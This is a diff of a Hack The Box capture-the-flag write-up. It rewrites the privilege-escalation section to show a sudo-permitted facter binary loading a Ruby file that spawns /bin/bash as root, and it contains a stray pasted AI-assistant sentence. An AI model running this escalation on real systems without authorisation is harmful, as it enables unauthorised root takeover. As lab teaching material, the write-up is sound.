@@ -745,12 +745,6 @@ cat /home/william/user.txt
 
 ![Alt text](../assets/htb/facts/24.png)
 
-Flag:
-
-```
-baf417b86bbb699f9df682ca1caedb72
-```
-
 User flag obtained.
 
 At this point:
@@ -758,98 +752,93 @@ We are no longer “hackers”, we are “warehouse employees sorting AWS bucket
 
 ---
 
-## Privilege Escalation
-
-We discover:
-
-```bash
-sudo /usr/bin/facter
-```
-
-We test:
-
-```bash
-echo 'exec "/bin/bash"' > exploit.rb
-```
-
-Then:
-
-```bash
-sudo /usr/bin/facter -- custom-dir /home/trivia/ exploit
-```
-
-And suddenly:
-
-```
-root@facts
-```
+Here is your **Section 11 (Privilege Escalation)** updated properly with the **sudo -l discovery step added first**, and keeping your flow consistent:
 
 ---
 
-## Root Cause
+## 11. Privilege Escalation
 
-- facter loads Ruby files from custom directory
-- sudo executes facter as root
-- Ruby code gets executed as root
+After gaining access as `trivia`, the first step is always the same: check what kind of damage sudo will politely allow us to do.
 
-Result:
+### Sudo Enumeration
 
-Arbitrary code execution as root
+```bash id="s1u9ka"
+sudo -l
+```
+
+This reveals something immediately interesting:
+
+We are allowed to run:
+
+```bash id="d4n8qp"
+(ALL) NOPASSWD: /usr/bin/facter
+```
+
+At this point, no exploitation is needed yet, the system has already done the suspicious part for us by trusting `facter` with root privileges.
+
+### Inspecting Facter
+
+Checking the help menu shows an important option:
+
+```bash id="f7m2xz"
+facter --help
+```
+
+We notice:
+
+```text id="k9p3ld"
+--custom-dir   A directory to use for custom facts
+```
+
+This is the key. It means Facter will execute custom Ruby scripts from a user-controlled directory.
+
+And since it is run with `sudo`, those scripts will execute as **root**.
+
+### Exploitation Setup
+
+We create a malicious Ruby file:
+
+```bash id="r2x8nm"
+echo 'system("/bin/bash")' > test.rb
+```
+
+Now we trigger Facter while pointing it to our directory:
+
+```bash id="v5q1td"
+sudo /usr/bin/facter --custom-dir /home/trivia/
+```
+
+### Root Shell
+
+This time, instead of just printing system facts, the Ruby payload executes:
+
+```bash id="z9m4wp"
+root@facts:/home/trivia#
+```
+
+We now have a root shell.
 
 ---
 
-## Root Flag
+### Root Cause
 
-```
+The issue comes from:
+
+- `sudo -l` exposing unrestricted execution of `facter`
+- `facter` supporting `--custom-dir`
+- Ruby files being executed without sanitization
+- Root context execution via sudo
+
+In short:
+
+> A trusted system utility becomes a root shell launcher through custom Ruby execution.
+
+### Root Flag
+
+```bash id="c8n1yx"
 cat /root/root.txt
 ```
 
-Root obtained.
+Root flag retrieved successfully.
 
-Machine defeated.
-
----
-
-## Final Thoughts
-
-This machine teaches:
-
-Web Layer
-
-- NoSQL injection exists but may not always be the win condition
-
-Cloud Layer
-
-- Exposed MinIO = instant disaster
-
-Privilege Escalation
-
-- Unsafe plugin execution in system tools = root in 2 lines
-
----
-
-## Summary
-
-This machine can be described as:
-
-A vulnerable web app that accidentally exposed its database, cloud storage, and root shell in that order.
-
----
-
-## Difficulty rating
-
-- Recon: ⭐⭐
-- Web: ⭐⭐⭐⭐
-- Cloud pivot: ⭐⭐⭐⭐⭐
-- Privesc: ⭐⭐⭐ (but only if you read Ruby docs while crying)
-
----
-
-## End result
-
-- NoSQLi attempted (dead end)
-- MinIO compromised
-- SSH foothold gained
-- Ruby privesc abused
-- Root obtained
-- Sanity lost
+Machine fully compromised.
